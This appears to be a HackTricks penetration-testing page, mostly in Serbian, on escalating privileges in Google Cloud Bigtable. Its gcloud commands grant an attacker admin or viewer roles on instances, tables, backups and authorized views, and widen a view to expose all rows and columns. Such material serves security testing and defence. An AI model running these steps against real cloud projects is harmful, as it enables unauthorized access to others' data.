# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Za više informacija o Bigtable pogledajte:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Dozvole:** `bigtable.instances.setIamPolicy` (i obično `bigtable.instances.getIamPolicy` za čitanje trenutnih bindinga).

Posedovanje IAM politike instance omogućava vam da sebi dodelite **`roles/bigtable.admin`** (ili bilo koju prilagođenu ulogu) koja se propagira na svaki klaster, tabelu, backup i autorizovani prikaz u instanci.

<details><summary>Dodelite sebi ulogu bigtable.admin na instanci</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> If you cannot list the existing bindings, craft a fresh policy document and push it with `gcloud bigtable instances set-iam-policy` as long as you keep yourself on it.

Nakon ovoga, proverite [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) tehnike za više načina da zloupotrebite Bigtable dozvole.

### `bigtable.tables.setIamPolicy`

**Dozvole:** `bigtable.tables.setIamPolicy` (opciono `bigtable.tables.getIamPolicy`).

Politike instance mogu biti zaključane dok su pojedinačne tabele dodeljene. Ako možete da izmenite IAM tabele, možete sebe **promovisati u vlasnika ciljanog skupa podataka** bez diranja drugih radnih opterećenja.

<details><summary>Dodelite sebi ulogu bigtable.admin na tabeli</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Nakon što potvrdite ovu dozvolu, pogledajte [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) techniques for more ways to abuse Bigtable permissions.


### `bigtable.backups.setIamPolicy`

**Dozvole:** `bigtable.backups.setIamPolicy`

Backups se mogu vratiti na **bilo koju instancu u bilo kojem projektu** kojim upravljate. Prvo, dajte svom identitetu pristup backup-u, zatim ga vratite u sandbox gde imate Admin/Owner role.

Ako imate dozvolu `bigtable.backups.setIamPolicy`, mogli biste sebi dodeliti dozvolu `bigtable.backups.restore` da biste vratili stare backup-e i pokušali pristupiti osetljivim informacijama.

<details><summary>Preuzimanje vlasništva nad backup snapshot-om</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Nakon što imate ovu dozvolu, pogledajte [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) kako da obnovite backup.


### Ažuriraj autorizovani pogled

**Dozvole:** `bigtable.authorizedViews.update`

Authorized Views bi trebalo da maskiraju redove/kolone. Modifikovanje ili brisanje istih **uklanja fino definisane zaštitne mehanizme** na koje se odbrambeni tim oslanja.

<details><summary>Ažuriraj autorizovani pogled da proširiš pristup</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

Nakon dobijanja ove dozvole pogledajte [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) како да прочитате из authorized view.

### `bigtable.authorizedViews.setIamPolicy`

**Dozvole:**  `bigtable.authorizedViews.setIamPolicy`.

Napadač sa ovom dozvolom može sebi dodeliti pristup Authorized View, koji može sadržati osetljive podatke do kojih inače ne bi imao pristup.

<details><summary>Dodelite sebi pristup authorized view</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

Nakon što obavite ovu proveru dozvola, pogledajte [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) za uputstvo kako čitati iz ovlašćenog prikaza.



{{#include ../../../banners/hacktricks-training.md}}
